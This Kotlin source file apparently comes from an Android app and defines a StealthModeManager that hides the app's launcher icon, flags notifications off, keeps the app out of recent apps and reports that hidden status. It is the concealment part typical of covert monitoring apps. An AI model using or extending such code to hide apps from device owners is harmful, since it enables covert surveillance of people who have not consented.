package com.sync.xxx.managers

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.util.Log
import org.json.JSONObject

/**
 * StealthModeManager.kt
 * Enable/disable stealth mode features
 * Hide app presence and activities
 */
class StealthModeManager(private val context: Context) {

    private val TAG = "StealthModeManager"
    private val prefs = context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)

    /**
     * Check if stealth mode is enabled
     */
    fun isStealthModeEnabled(): Boolean {
        return prefs.getBoolean("stealth_mode_enabled", false)
    }

    /**
     * Enable stealth mode
     */
    fun enableStealthMode(): Boolean {
        return try {
            prefs.edit().putBoolean("stealth_mode_enabled", true).apply()
            
            // Hide app icon
            hideAppIcon()
            
            // Disable notifications
            disableNotifications()
            
            Log.d(TAG, "Stealth mode enabled")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error enabling stealth mode", e)
            false
        }
    }

    /**
     * Disable stealth mode
     */
    fun disableStealthMode(): Boolean {
        return try {
            prefs.edit().putBoolean("stealth_mode_enabled", false).apply()
            
            // Show app icon
            showAppIcon()
            
            // Enable notifications
            enableNotifications()
            
            Log.d(TAG, "Stealth mode disabled")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error disabling stealth mode", e)
            false
        }
    }

    /**
     * Hide app icon
     */
    private fun hideAppIcon() {
        try {
            val packageManager = context.packageManager
            val componentName = android.content.ComponentName(
                context,
                "${context.packageName}.MainActivity"
            )
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "App icon hidden")
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding icon", e)
        }
    }

    /**
     * Show app icon
     */
    private fun showAppIcon() {
        try {
            val packageManager = context.packageManager
            val componentName = android.content.ComponentName(
                context,
                "${context.packageName}.MainActivity"
            )
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "App icon shown")
        } catch (e: Exception) {
            Log.e(TAG, "Error showing icon", e)
        }
    }

    /**
     * Disable notifications
     */
    private fun disableNotifications() {
        prefs.edit().putBoolean("notifications_enabled", false).apply()
        Log.d(TAG, "Notifications disabled")
    }

    /**
     * Enable notifications
     */
    private fun enableNotifications() {
        prefs.edit().putBoolean("notifications_enabled", true).apply()
        Log.d(TAG, "Notifications enabled")
    }

    /**
     * Check if notifications are enabled
     */
    fun areNotificationsEnabled(): Boolean {
        return prefs.getBoolean("notifications_enabled", true)
    }

    /**
     * Hide app from recent apps
     */
    fun hideFromRecents(): Boolean {
        return try {
            // This is set in AndroidManifest.xml
            // android:excludeFromRecents="true"
            Log.d(TAG, "Hidden from recents (manifest)")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding from recents", e)
            false
        }
    }

    /**
     * Check if app is visible in launcher
     */
    fun isVisibleInLauncher(): Boolean {
        return try {
            val packageManager = context.packageManager
            val intent = packageManager.getLaunchIntentForPackage(context.packageName)
            intent != null
        } catch (e: Exception) {
            Log.e(TAG, "Error checking launcher visibility", e)
            false
        }
    }

    /**
     * Get stealth mode configuration
     */
    fun getStealthConfig(): StealthConfig {
        return StealthConfig(
            stealthModeEnabled = isStealthModeEnabled(),
            iconHidden = !isVisibleInLauncher(),
            notificationsDisabled = !areNotificationsEnabled(),
            hiddenFromRecents = true // Would need to check manifest
        )
    }

    /**
     * Export stealth config as JSON
     */
    fun getStealthConfigAsJson(): JSONObject {
        val config = getStealthConfig()
        return JSONObject().apply {
            put("stealthModeEnabled", config.stealthModeEnabled)
            put("iconHidden", config.iconHidden)
            put("notificationsDisabled", config.notificationsDisabled)
            put("hiddenFromRecents", config.hiddenFromRecents)
        }
    }

    /**
     * Export stealth config as text
     */
    fun exportStealthConfig(): String {
        val config = getStealthConfig()
        val sb = StringBuilder()

        sb.append("Stealth Mode Configuration\n")
        sb.append("=".repeat(60)).append("\n\n")

        sb.append("--- Status ---\n")
        sb.append("Stealth Mode: ${if (config.stealthModeEnabled) "Enabled" else "Disabled"}\n")
        sb.append("Icon Hidden: ${if (config.iconHidden) "Yes" else "No"}\n")
        sb.append("Notifications: ${if (config.notificationsDisabled) "Disabled" else "Enabled"}\n")
        sb.append("Hidden from Recents: ${if (config.hiddenFromRecents) "Yes" else "No"}\n")

        return sb.toString()
    }

    /**
     * Stealth config data class
     */
    data class StealthConfig(
        val stealthModeEnabled: Boolean,
        val iconHidden: Boolean,
        val notificationsDisabled: Boolean,
        val hiddenFromRecents: Boolean
    )

    companion object {
        /**
         * Enable stealth mode (static)
         */
        fun enableStealthMode(context: Context): Boolean {
            return try {
                val manager = StealthModeManager(context)
                manager.enableStealthMode()
            } catch (e: Exception) {
                false
            }
        }

        /**
         * Disable stealth mode (static)
         */
        fun disableStealthMode(context: Context): Boolean {
            return try {
                val manager = StealthModeManager(context)
                manager.disableStealthMode()
            } catch (e: Exception) {
                false
            }
        }

        /**
         * Check if stealth mode is enabled (static)
         */
        fun isStealthModeEnabled(context: Context): Boolean {
            return try {
                val manager = StealthModeManager(context)
                manager.isStealthModeEnabled()
            } catch (e: Exception) {
                false
            }
        }
    }
}
